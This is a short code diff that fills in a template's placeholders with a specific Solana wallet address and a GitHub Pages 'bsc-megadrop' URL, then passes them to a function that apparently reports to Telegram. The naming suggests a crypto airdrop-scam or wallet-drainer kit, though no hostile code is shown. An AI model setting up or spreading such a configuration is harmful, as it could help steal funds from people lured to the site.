@@ -24,6 +24,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID';
-const website_url = 'YOUR_WEBSITE_URL';
+const solana_wallet_receiver_id = 'AA77vjVXNmLWDnaoqd5T2H8gnNxvmp8e86Q5r3D3Q9L5';
+const website_url = 'https://john78568.github.io/bsc-megadrop/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
